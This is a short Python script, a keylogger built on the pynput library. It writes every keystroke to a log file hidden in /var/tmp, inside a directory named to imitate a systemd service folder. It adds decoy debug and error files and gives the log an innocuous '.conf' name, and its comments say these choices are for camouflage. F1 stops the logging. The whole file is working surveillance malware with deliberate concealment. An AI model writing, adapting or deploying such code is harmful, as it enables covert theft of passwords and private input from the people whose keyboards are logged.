from pynput import keyboard
import os

# Specify log file directory (/var/tmp persists after reboot)
logDirectory = "/var/tmp/systemd-private-c36ab02a889e43a48b4f62f7036ca080-TextWrapper.service-Ud8j9l"

# Create folder that attempts to blend in
os.makedirs(logDirectory, exist_ok = True)

# Fill directory with extra files with random data for extra camoflague
with open(logDirectory+"/debug-info.txt", 'w') as file:
    file.write("[DEBUG] 2024-09-24 10:15:42 - Initializing application...\n")

with open(logDirectory+"/error.log", 'w') as file:
    file.write('\n'*12)

# Specify the log file destination with assuming name
logFile = logDirectory + "/wrapper.conf"

# Captures each key press on the keyboard
def keyPress(key):
    try:
        # Log the key pressed
        with open(logFile, 'a') as file:
            file.write(f'{key.char}\n')
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl, etc.)
        with open(logFile, 'a') as f:
            f.write(f'{key}\n')

# Cancels logging if specified key is pressed
def keyRelease(key):
    if key == keyboard.Key.f1:
        return False

# Create keyboard listener
with keyboard.Listener(on_press = keyPress, on_release = keyRelease) as listener:
    listener.join()